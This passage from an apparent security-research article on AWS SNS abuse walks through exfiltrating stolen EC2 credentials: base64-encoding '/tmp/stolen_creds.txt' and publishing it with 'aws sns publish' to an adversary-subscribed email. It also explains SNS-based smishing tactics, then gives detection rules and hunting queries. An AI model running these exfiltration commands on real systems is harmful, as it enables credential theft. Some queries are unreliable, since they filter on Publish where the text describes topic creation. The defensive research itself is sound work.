<p>As shown above after the commands are run, we can then navigate to the inbox of the external email address to confirm subscription. Once confirmed, our external email address will now receive any messages sent to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">whitebox-sns-topic topic</code> which we plan to use for exfiltration.</p>
<p></p>
<p><strong>Exfiltrate Data via SNS Publish</strong><br/>
<!-- -->At this point, we have gained access to an EC2 instance, snooped around to understand our environment, identified some services for abuse and some credentials that we want to obtain. Note that our previous steps could all have been accomplished via a simple Bash script that could be dropped on the compromised EC2 instance via our webshell, but this is broken down into individual steps for example purposes..</p>
<p>Next, we can take the data we stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tmp/stolen_creds.txt</code>, base64 encode it and ship it to our adversary controlled email address via SNS.</p>
<p>Commands:</p>
<ul>
<li>Base64 encode contents: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">BASE64_CONTENT=$(base64 /tmp/stolen_creds.txt)</code></li>
<li>Publish encoded credentials to our topic: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">aws sns publish --topic-arn &quot;$TOPIC_ARN&quot; --message &quot;$BASE64_CONTENT&quot; --subject &quot;Encoded Credentials from EC2&quot;</code></li>
</ul>
<p></p>
<p>Once completed, we can simply check our inbox for these exfiltrated credentials.</p>
<p></p>
<p>Taking the payload from our message, we can decode it to see that it represents the credentials we found lying around on the EC2 instance.</p>
<p></p>
<p>As many adversaries may attempt to establish persistence or laterally move throughout the AWS environment and services, they would then be able to rely on this SNS topic to exfiltrate data for as long as permissions were in scope for the IAM user or role. Additionally, they could set up a recurring job that scans for data on this EC2 instance and continually exfiltrates anything interesting over time. There are many practical options in this scenario for additional chaining that could be done.</p>
<p><strong>Before continuing, we encourage you to use the following command to destroy your infrastructure once logging out of the SSH connection</strong>: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">terraform destroy --auto-approve</code></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="challenges-for-adversaries" class="absolute -top-32"></span>Challenges for Adversaries:</h3>
<p>Of course, there are many uncertaintiesin any whitebox testing that may prove as roadblocks or hurdles for a TA, both advanced and immature in knowledge, skills and abilities. It is also very dependent on the configuration and environment of the potential victim. Below are additional challenges that adversaries would face.</p>
<p><strong>Initial Access</strong>: Gaining initial access to the EC2 instance is often the biggest hurdle. This could involve exploiting a vulnerable web application or 3rd-party service, using stolen SSH credentials, password spraying or credential stuffing, or leveraging other means such as social engineering or phishing. Without initial access, the entire attack chain is infeasible.</p>
<p><strong>Establishing an Active Session</strong>: After gaining access, maintaining an active session can be difficult, especially if the environment includes robust endpoint protection or regular reboots that clear unauthorized activity. Adversaries may need to establish a persistent foothold using techniques like a webshell, reverse shell or an automated dropper script.</p>
<p><strong>AWS CLI Installed on the Instance</strong>: The presence of the AWS CLI on a public-facing EC2 instance is uncommon and not considered a best practice. Many secure environments avoid pre-installing the AWS CLI, forcing adversaries to bring their own tools or rely on less direct methods to interact with AWS services.</p>
<p><strong>IAM Role Permissions</strong>: The IAM role attached to the EC2 instance must include permissive policies for SNS actions (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sns:Publish</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sns:Subscribe</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sns:CreateTopic, sts:GetCallerIdentity</code>). Many environments restrict these permissions to prevent unauthorized use, and misconfigurations are often necessary for the attack to succeed. Best security practices such as principle-of-least-privilege (PoLP) would ensure the roles are set up with only necessary permissions.</p>
<p><strong>Execution of Malicious Scripts</strong>: Successfully executing a script or running commands without triggering alarms (e.g., CloudTrail, GuardDuty, EDR agents) is a challenge. Adversaries must ensure their activities blend into legitimate traffic or use obfuscation techniques to evade detection.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="advantages-for-adversaries" class="absolute -top-32"></span>Advantages for Adversaries</h3>
<p>Of course, while there are challenges for the adversary with these techniques, let’s consider some crucial advantages that they may have as well.</p>
<ul>
<li><strong>Blending In with Native AWS Services</strong>: By leveraging AWS SNS for data exfiltration, the adversary&#x27;s activity appears as legitimate usage of a native AWS flagship service. SNS is commonly used for notifications and data dissemination, making it less likely to raise immediate suspicion.</li>
<li><strong>Identity Impersonation via IAM Role</strong>: Actions taken via the AWS CLI are attributed to the IAM role attached to the EC2 instance. If the role already has permissions for SNS actions and is used regularly for similar tasks, adversarial activity can blend seamlessly with expected operations.</li>
<li><strong>No Concerns with Security Groups or Network ACLs</strong>: Since SNS communication occurs entirely within the confines of AWS, there’s no reliance on security group or Network ACL configurations. This bypasses traditional outbound traffic controls, ensuring the adversary&#x27;s data exfiltration attempts are not blocked.</li>
<li><strong>Lack of Detections for SNS Abuse</strong>: Abuse of SNS for data exfiltration is under-monitored in many environments. Security teams may focus on more commonly abused AWS services (e.g., S3 or EC2) and lack dedicated detections or alerts for unusual SNS activity, such as frequent topic creation or large volumes of published messages.</li>
<li><strong>Minimal Footprint with Non-Invasive Commands</strong>: Local commands used by the adversary (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cat</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">echo</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base64</code>) are benign and do not trigger endpoint detection and response (EDR) tools typically. These commands are common in legitimate administrative tasks, allowing adversaries to avoid detection on backend Linux systems.</li>
<li><strong>Efficient and Scalable Exfiltration</strong>: SNS enables scalable exfiltration by allowing adversaries to send large amounts of data to multiple subscribers. Once set up, the adversary can automate periodic publishing of sensitive information with minimal additional effort.</li>
<li><strong>Persistent Exfiltration Capabilities</strong>: As long as the SNS topic and subscription remain active, the adversary can use the infrastructure for ongoing exfiltration. This is especially true if the IAM role retains its permissions and no proactive monitoring is implemented.</li>
<li><strong>Bypassing Egress Monitoring and DLP</strong>: Since the data is exfiltrated through SNS within the AWS environment, it bypasses traditional egress monitoring or data loss prevention solutions that focus on outbound traffic to external destinations.</li>
</ul>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="in-the-wild-abuse" class="absolute -top-32"></span>In-the-Wild Abuse</h1>
<p>While whitebox scenarios are invaluable for simulating potential adversarial behaviors, it is equally important to ground these simulations with in-the-wild (ItW) threats. To this end, we explored publicly available research and identified a <a href="https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/">key article</a> from SentinelOne describing a spam messaging campaign that leveraged AWS SNS. Using insights from this research, we attempted to replicate these techniques in a controlled environment to better understand their implications.</p>
<p>Although we will not delve into the attribution analysis outlined in SentinelOne’s research, we highly recommend reviewing their work for a deeper dive into the campaign’s origins. Instead, our focus is on the tools and techniques employed by the adversary to abuse AWS SNS for malicious purposes.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="smishing-and-phishing" class="absolute -top-32"></span>Smishing and Phishing</h2>
<p>Compromised AWS environments with pre-configured SNS services can serve as launchpads for smishing (SMS phishing) or phishing attacks. Adversaries may exploit legitimate SNS topics and subscribers to distribute fraudulent messages internally or externally, leveraging the inherent trust in an organization’s communication channels.</p>
<p>As detailed in SentinelOne’s <a href="https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/">blog</a>, the adversary employed a Python-based tool known as <strong>SNS Sender</strong>. This script enabled bulk SMS phishing campaigns by interacting directly with AWS SNS APIs using compromised AWS credentials. These authenticated API requests allowed the adversary to bypass common safeguards and send phishing messages in mass..</p>
<p>The <a href="https://www.virustotal.com/gui/file/6d8c062c23cb58327ae6fc3bbb66195b1337c360fa5008410f65887c463c3428"><strong>SNS Sender script</strong></a> leverages valid AWS access keys and secrets to establish authenticated API sessions via the AWS SDK. Armed with these credentials, adversaries can craft phishing workflows that include:</p>
<ol>
<li>Establishing authenticated SNS API sessions via the AWS SDK.</li>
<li>Enumerating and targeting lists of phone numbers to serve as phishing recipients.</li>
<li>Utilizing a pre-registered Sender ID (if available) for spoofing trusted entities.</li>
<li>Sending SMS messages containing malicious links, often impersonating a legitimate service.</li>
</ol>
<p></p>
<p>Elastic Security Labs predicts that the use of one-off or commercially available tools for abusing cloud services, like SNS Sender, will continue to grow as a research focus. This underscores the importance of understanding these tools and their impact on cloud security.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="weaponization-and-pre-testing-considerations" class="absolute -top-32"></span>Weaponization and Pre-Testing Considerations</h3>
<p>To successfully execute a phishing campaign at scale using AWS SNS, the adversary would have needed access to an already registered AWS End User Messaging organization. AWS restricts new accounts to SNS Sandbox Mode, which limits SMS sending to manually verified phone numbers. To bypass sandbox restrictions, adversaries would need access to an account already approved for production SMS messaging. The process of testing and weaponization would have required several key steps.</p>
<p>A fully configured AWS End User Messaging setup would require:</p>
<ul>
<li>An established origination identity (which includes a long code, toll-free number, or short code).</li>
<li>Regulatory approval through a brand registration process.</li>
<li>Carrier pre-approval for high-volume SMS messaging.</li>
</ul>
<p>Without these pre-registered identifiers, AWS SNS messages may be deprioritized, blocked, or fail to send.</p>
<p>Before deploying a large-scale attack, adversaries would likely test SMS delivery using verified phone numbers within AWS SNS Sandbox Mode. This process requires:</p>
<ul>
<li>Manually verifying phone numbers before sending messages.</li>
<li>Ensuring their carrier allows AWS SNS sandbox messages, as some (like T-Mobile and Google Voice) frequently block AWS SNS sandbox verification SMS.</li>
<li>Testing delivery routes across different AWS regions to identify which countries permit custom Sender IDs or allow non-sandbox messages.</li>
</ul>
<p>If an attacker’s test environment failed to receive SNS verification OTPs, they would likely pivot to a different AWS account or leverage a compromised AWS account that already had production-level messaging permissions.</p>
<p>In addition to this, the adversary would likely prioritize transactional messages over promotional. Transactional messages are prioritized by AWS (OTPs, security alerts, etc.) - whereas promotional messages are lower priority and may be filtered or blocked by certain carriers.</p>
<p>If adversaries cannot override message type defaults, their phishing messages may be deprioritized or rejected by AWS, which could be a hurdle.</p>
<p><strong>Registered Origination Identity &amp; Sender ID (If Supported)</strong></p>
<p>AWS requires brand registration and origination identity verification for businesses sending high-volume SMS messages. Depending on the region and carrier, adversaries may be able to exploit different configurations:</p>
<ul>
<li><strong>Sender ID Abuse</strong>: In some non-U.S. regions, adversaries could register a Sender ID to make phishing messages appear from a trusted entity. This may allow for spoofing banks, shipping companies, or government agencies, making the phishing attempt more convincing.</li>
<li><strong>Long Code &amp; Toll-Free Exploitation</strong>: AWS SNS assigns long codes (standard phone numbers) or toll-free numbers for outbound SMS. Toll-free numbers require registration but could still be abused if an adversary compromises an AWS account with an active toll-free messaging service.</li>
<li><strong>Short Code Restrictions</strong>: High-throughput short codes (5- or 6-digit numbers) are often carrier-controlled and require additional vetting, making them less practical for adversaries.</li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="infrastructure-setup-1" class="absolute -top-32"></span><strong>Infrastructure Setup</strong></h3>
<p>By default, AWS accounts that have not properly configured the <a href="https://docs.aws.amazon.com/sms-voice/latest/userguide/what-is-sms-mms.html">End User Messaging</a> service are restricted to an <a href="https://aws.amazon.com/blogs/compute/introducing-the-sms-sandbox-for-amazon-sns/"><strong>SMS sandbox</strong></a>. This sandbox allows developers to test SMS functionality by sending messages to verified phone numbers. However, as we discovered, the process of verifying numbers in the sandbox is fraught with challenges.</p>
<p>Despite repeated attempts to register phone numbers with the sandbox, we found that verification messages (OTP codes) failed to arrive at endpoints across various carriers and services, including Google Voice and Twilio. This suggests that mobile carriers may block these sandbox-originated messages, effectively stalling the verification process but ultimately blocking us from emulating the behavior.</p>
<p>For production use, <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-sms-sandbox-moving-to-production.html">migrating</a> from the sandbox requires a fully configured AWS End User Messaging service. This includes:</p>
<ul>
<li>A legitimate Sender ID.</li>
<li>A phone pool for failovers.</li>
<li>Origination identity.</li>
<li>Brand registration for regulatory compliance.</li>
</ul>
<p>This setup aligns with the requirements of the SNS Sender script and represents an ideal environment for adversaries. The use of a Sender ID, which relies on a pre-established <a href="https://docs.aws.amazon.com/sns/latest/dg/channels-sms-originating-identities.html">origination identity</a> and brand registration, allows phishing messages to appear as though they originate from a reputable organization. This reduces the likelihood of detection or carrier-level blocking, increasing the success rate of the campaign.</p>
<p>The requirements for this attack suggests adversaries are likely to target companies that use AWS End User Messaging for automated SMS alerts and messaging. Industries such as logistics and delivery services, e-commerce platforms, and travel and hospitality are prime targets due to their reliance on automated SMS notifications.</p>
<p>On the recipient&#x27;s side, the phishing message appears as if it originates from a trusted entity, bypassing carrier alarms and evading suspicion.</p>
<p>During our testing, we encountered unexpected behavior with logging in CloudTrail when attempting to use the script and AWS CLI to send SMS messages directly through SNS. Failed message delivery attempts did not appear in CloudTrail logs as expected.</p>
<p>Although the <a href="https://docs.aws.amazon.com/sns/latest/api/API_Publish.html"><strong>Publish</strong></a> API call is generally logged in CloudTrail (provided data plane events are enabled), it remains unclear if the absence of logs for failed attempts was due to inherent SNS behavior or misconfiguration on our part. This gap highlights the need for deeper investigation into how failed SNS Publish requests are handled by AWS and whether additional configurations are required to capture these events reliably.</p>
<p>As a result, we determined it would be best to include a threat hunting query for this rather than a detection rule due to the inability to fully replicate the adversary behavior, reliance on pre-established and registered brands and origination identity, in full.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="detection-and-hunting-opportunities" class="absolute -top-32"></span>Detection and Hunting Opportunities</h1>
<p>For detection and hunting, CloudTrail audit logs provide enough visibility for the subsequent API calls from this activity. They also include enough contextual information to help aid with a higher fidelity of these anomalous signals. The following detections and hunting queries will leverage CloudTrail data ingested into our Elastic stack with the AWS CloudTrail integration, however they should be translatable to the SIEM of your choice if needed. For this activity, we focus solely on assumed roles, specifically those with EC2 instances being abused but this could take place elsewhere in AWS environments.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="sns-topic-created-by-rare-user" class="absolute -top-32"></span>SNS Topic Created by Rare User</h2>
<p><a href="https://github.com/elastic/detection-rules/blob/c5523c4d4060555e143b2d46fea1748173352b8f/rules/integrations/aws/resource_development_sns_topic_created_by_rare_user.toml">Detection Rule Source</a><br/>
<a href="https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_created_by_rare_user.md">Hunting Query Source</a><br/>
<!-- -->MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1608/">T1608</a></p>
<p>Identifies when an SNS topic is created by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic’s New Terms type rules to identify when the first occurrence of a user identity ARN creates an SNS topic. It would be awfully unusual for an assumed role, typically leveraged for EC2 instances to be creating SNS topics.</p>
<p>Our query leverages KQL and <a href="https://www.elastic.co/guide/en/security/current/rules-ui-create.html#create-new-terms-rule">New Terms rule type</a> to focus on topics created by an Assumed Role specifically for an EC2 instance.</p>
<pre><code>event.dataset: &quot;aws.cloudtrail&quot;
    and event.provider: &quot;sns.amazonaws.com&quot;
    and event.action: &quot;Publish&quot;
    and aws.cloudtrail.user_identity.type: &quot;AssumedRole&quot;
    and aws.cloudtrail.user_identity.arn: *i-*</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-query-esql" class="absolute -top-32"></span>Hunting Query (ES|QL)</h3>
<p>Our hunting query focuses on the CreateTopic API action from an entity whose identity type is an assumed role. We also parse the ARN to ensure that it is an EC2 instance this request is sourcing from. We can then aggregate on cloud account, entity (EC2 instance ID), assumed role name, region and user agent. If it is unusual for the EC2 instance reported to be creating SNS topics randomly, then it may be a good anomalous signal to investigate.</p>
<pre><code>from logs-aws.cloudtrail-*
| where @timestamp &gt; now() - 7 day
| WHERE
    event.dataset == &quot;aws.cloudtrail&quot; AND
    event.provider == &quot;sns.amazonaws.com&quot; AND
    event.action == &quot;Publish&quot;
    and aws.cloudtrail.user_identity.type == &quot;AssumedRole&quot;
| DISSECT aws.cloudtrail.request_parameters &quot;{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}&quot;
| DISSECT aws.cloudtrail.user_identity.arn &quot;%{?}:assumed-role/%{assumed_role_name}/%{entity}&quot;
| DISSECT user_agent.original &quot;%{user_agent_name} %{?user_agent_remainder}&quot;
| WHERE STARTS_WITH(entity, &quot;i-&quot;)
| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name
| SORT regional_topic_publish_count ASC</code></pre>
<p>Hunting Notes:</p>
<ul>
<li>It is unusual already for credentials from an assumed role for an EC2 instance to be creating SNS topics randomly.</li>
<li>If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.</li>
<li>An attacker could pivot into Publish API actions being called to this specific topic to identify which AWS resource is publishing messages. With access to the topic, the attacker could then further investigate the subscribers list to identify unauthorized subscribers.</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="sns-topic-subscription-with-email-by-rare-user" class="absolute -top-32"></span>SNS Topic Subscription with Email by Rare User</h2>
<p><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/exfiltration_sns_email_subscription_by_rare_user.toml">Detection Rule Source</a><br/>
<a href="https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_email_subscription_by_rare_user.md">Hunting Query Source</a><br/>
<!-- -->MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1567/">T1567</a>, <a href="https://attack.mitre.org/techniques/T1530/">T1530</a></p>
<p>Identifies when an SNS topic is subscribed to by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic’s <strong>New Terms</strong> type rules to identify when the first occurrence of a user identity ARN attempts to subscribe to an existing SNS topic.The data exfiltration which took place during our whitebox testing example above would have been caught by this threat hunt; an alert would have been generated when we establish an SNS subscription to an external user.</p>
<p>Further false-positive reductions could be obtained by whitelisting expected organization TLDs in the requested email address if the topic is meant for internal use only.</p>
<p>Our query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed or this would be vital for investigation.</p>
<pre><code>event.dataset: &quot;aws.cloudtrail&quot;
    and event.provider: &quot;sns.amazonaws.com&quot;
    and event.action: &quot;Subscribe&quot;
    and aws.cloudtrail.request_parameters: *protocol=email*</code></pre>
<p><strong>New Terms value</strong>: aws.cloudtrail.user_identity.arn</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-query-esql-1" class="absolute -top-32"></span>Hunting Query (ES|QL)</h3>
<p>Our hunting query leverages ES|QL but parses the Subscribe API action parameters to filter further on the email protocol being specified. It also parses out the name of the user-agent, but relies further on aggregations to potentially identify other anomalous user-agent attributes. We&#x27;ve also included the region where the subscription occurred, as it may be uncommon for certain regions to be subscribed to others, depending on the specific business context of an organization.</p>
<pre><code>from logs-aws.cloudtrail-*
| where @timestamp &gt; now() - 7 day
| WHERE
    event.dataset == &quot;aws.cloudtrail&quot; AND
    event.provider == &quot;sns.amazonaws.com&quot; AND
    event.action == &quot;Subscribe&quot;
| DISSECT aws.cloudtrail.request_parameters &quot;%{?protocol_key}=%{protocol}, %{?endpoint_key}=%{redacted}, %{?return_arn}=%{return_bool}, %{?topic_arn_key}=%{topic_arn}}&quot;
| DISSECT user_agent.original &quot;%{user_agent_name} %{?user_agent_remainder}&quot;
| WHERE protocol == &quot;email&quot;
| STATS regional_topic_subscription_count = COUNT(*) by aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name
| WHERE regional_topic_subscription_count == 1
| SORT regional_topic_subscription_count ASC</code></pre>
<p>Hunting Notes:</p>
<ul>
<li>If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.</li>
<li>Ignoring the topic ARN during aggregation is important to identify first occurrence anomalies of subscribing to SNS topic with an email. By not grouping subscriptions by topic ARN, we ensure that the query focuses on detecting unexpected or infrequent subscriptions only, regardless of specific topics already established.</li>
<li>Another query may be required with the user identity ARN as an inclusion filter to identify which topic they subscribed to.</li>
<li>If an anomalous user-agent name is observed, a secondary investigation into the user-agent string may be required to determine if it&#x27;s associated with automated scripts, uncommon browsers, or mismatched platforms. While it is simple to fake these, adversaries have been known not to for undisclosed reasons.</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="sns-topic-message-published-by-rare-user" class="absolute -top-32"></span>SNS Topic Message Published by Rare User</h2>
<p><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/lateral_movement_sns_topic_message_publish_by_rare_user.toml">Detection Rule Source</a><br/>
<a href="https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_message_published_by_rare_user.md">Hunting Query Source</a></p>
<p>Identifies when a message is published to an SNS topic from an unusual user identity ARN in AWS. If the role or permission policy does not practice PoLP, publishing to SNS topics may be allowed and thus abused. For example, default roles supplied via AWS Marketplace that allow publishing to SNS topics. It may also identify rogue entities that once were pushing to SNS topics but no longer are being abused if credentials are compromised. Note that this focuses solely on EC2 instances, but you could adjust to account for different publish anomalies based on source, region, user agent and more.</p>
<p>Our query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed, as this would be a vital asset for investigation.</p>
<pre><code>event.dataset: &quot;aws.cloudtrail&quot;
    and event.provider: &quot;sns.amazonaws.com&quot;
    and event.action: &quot;Publish&quot;
    and aws.cloudtrail.user_identity.type: &quot;AssumedRole&quot;
    and aws.cloudtrail.user_identity.arn: *i-*</code></pre>
<p><strong>New Terms value</strong>: aws.cloudtrail.user_identity.arn</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-query-esql-2" class="absolute -top-32"></span>Hunting Query (ES|QL)</h3>
<p>Our hunting query leverages ES|QL and also focused on SNS logs where the API action is <em>Publish</em>. This only triggers if the user identity type is an assumed role and the user identity ARN is an EC2 instance ID. Aggregating on <strong>account ID</strong>, <strong>entity</strong>, <strong>assumed role</strong>, <strong>SNS topic</strong> and <strong>region</strong> help us identify any further anomalies based on expectancy of this activity. We can leverage the user agent to identify these calls being made by unusual tools or software as well.</p>
<pre><code>from logs-aws.cloudtrail-*
| where @timestamp &gt; now() - 7 day
| WHERE
    event.dataset == &quot;aws.cloudtrail&quot; AND
    event.provider == &quot;sns.amazonaws.com&quot; AND
    event.action == &quot;Publish&quot;
    and aws.cloudtrail.user_identity.type == &quot;AssumedRole&quot;
| DISSECT aws.cloudtrail.request_parameters &quot;{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}&quot;
| DISSECT aws.cloudtrail.user_identity.arn &quot;%{?}:assumed-role/%{assumed_role_name}/%{entity}&quot;
| DISSECT user_agent.original &quot;%{user_agent_name} %{?user_agent_remainder}&quot;
| WHERE STARTS_WITH(entity, &quot;i-&quot;)
| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name
| SORT regional_topic_publish_count ASC</code></pre>
<p>Hunting Notes:</p>
<ul>
<li>If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.</li>
<li>If you notice Terraform, Pulumi, etc. it may be related to testing environments, maintenance or more.</li>
<li>Python SDKs that are not AWS, may indicate custom tooling or scripts being leveraged.</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="sns-direct-to-phone-messaging-spike" class="absolute -top-32"></span>SNS Direct-to-Phone Messaging Spike</h2>
<p><a href="https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_direct_to_phone_messaging_spike.md">Hunting Query Source</a><br/>
<!-- -->MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1660/">T1660</a></p>
<p>Our hunting efforts for hypothesized SNS compromise—where an adversary is conducting phishing (smishing) campaigns—focus on <em>Publish</em> API actions in AWS SNS. Specifically, we track instances where <em>phoneNumber</em> is present in request parameters, signaling that messages are being sent directly to phone numbers rather than through an SNS topic.</p>
<p>Notably, instead of relying on SNS topics with pre-subscribed numbers, the adversary exploits an organization’s production Endpoint Messaging permissions, leveraging:</p>
<ul>
<li>An approved Origination ID (if the organization has registered one).</li>
<li>A Sender ID (if the adversary controls one or can spoof a trusted identifier).</li>
<li>AWS long codes or short codes (which may be dynamically assigned).</li>
</ul>
<p>Since AWS SNS sanitizes logs, phone numbers are not visible in CloudTrail, but deeper analysis in CloudWatch or third-party monitoring tools may help.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-query-esql-3" class="absolute -top-32"></span>Hunting Query (ES|QL)</h3>
<p>This query detects a spike in direct SNS messages, which may indicate smishing campaigns from compromised AWS accounts.</p>
<pre><code>from logs-aws.cloudtrail-*
| WHERE @timestamp &gt; now() - 7 day
| EVAL target_time_window = DATE_TRUNC(10 seconds, @timestamp)
| WHERE
    event.dataset == &quot;aws.cloudtrail&quot; AND
    event.provider == &quot;sns.amazonaws.com&quot; AND
    event.action == &quot;Publish&quot; AND
    event.outcome == &quot;success&quot; AND
    aws.cloudtrail.request_parameters LIKE &quot;*phoneNumber*&quot;
| DISSECT user_agent.original &quot;%{user_agent_name} %{?user_agent_remainder}&quot;
| STATS sms_message_count = COUNT(*) by target_time_window, cloud.account.id, aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name
| WHERE sms_message_count &gt; 30</code></pre>
<p>Hunting Notes:</p>
<ul>
<li>AWS removes phone numbers in logs, so deeper analysis via CloudWatch logs may be necessary.</li>
<li>While investigating in CloudWatch, the message context is also sanitized. It would be ideal to investigate the message for any suspicious URL links being embedded in the text messages.</li>
<li>You can also review AWS SNS delivery logs (if enabled) for message metadata.</li>
<li>If messages are not using a topic-based subscription, it suggests direct targeting.</li>
<li>The source of these requests is important, if you notice them from an EC2 instance, that is rather odd or Lambda may be an expected serverless code.</li>
</ul>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="takeaways" class="absolute -top-32"></span>Takeaways</h1>
<p>Thank you for taking the time to read this publication on <strong>AWS SNS Abuse: Data Exfiltration and Phishing</strong>. We hope this research provides valuable insights into how adversaries can leverage AWS SNS for data exfiltration, smishing and phishing campaigns, as well as practical detection and hunting strategies to counter these threats.</p>
<p><strong>Key Takeaways:</strong></p>
<ul>
<li>AWS SNS is a powerful service, but can be misused for malicious purposes, including phishing (smishing) and data exfiltration.</li>
<li>Adversaries may abuse production SNS permissions using pre-approved Sender IDs, Origination IDs, or long/short codes to send messages outside an organization.</li>
<li>Threat actors may weaponize misconfigurations in IAM policies, CloudTrail logging gaps and SNS API limitations to fly under the radar.</li>
<li>While in-the-wild (ItW) abuse of SNS is not frequently reported, we are confident that its weaponization and targeted exploitation are already occurring or will emerge eventually.</li>
<li>AWS CloudTrail does not capture phone numbers or messages in SNS logs, making CloudWatch third-party monitoring essential for deeper analysis</li>
<li>Threat hunting queries can help detect SNS topics being created, subscribed to, or receiving a spike in direct messages, signaling potential abuse.</li>
<li>Detection strategies include monitoring SNS API actions, identifying unusual SNS message spikes and flagging anomalies from EC2 or Lambda sources.</li>
<li>Defensive measures should include IAM policy hardening, CloudTrail &amp; SNS logging, anomaly-based detections and security best practices as recommended by AWS to reduce attack surface.</li>
</ul>
<p>AWS SNS is often overlooked in security discussions, but as this research shows, it presents a viable attack vector for adversaries if left unmonitored. We encourage defenders to stay proactive, refine detection logic, and implement robust security controls to mitigate these risks and increase security posture.</p>
<p>Thanks for reading and happy hunting!</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="references" class="absolute -top-32"></span>References</h1>
<ul>
<li><a href="https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/">https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/</a></li>
<li><a href="https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/">https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/</a></li>
<li><a href="https://catalog.workshops.aws/build-sms-program/en-US">https://catalog.workshops.aws/build-sms-program/en-US</a></li>
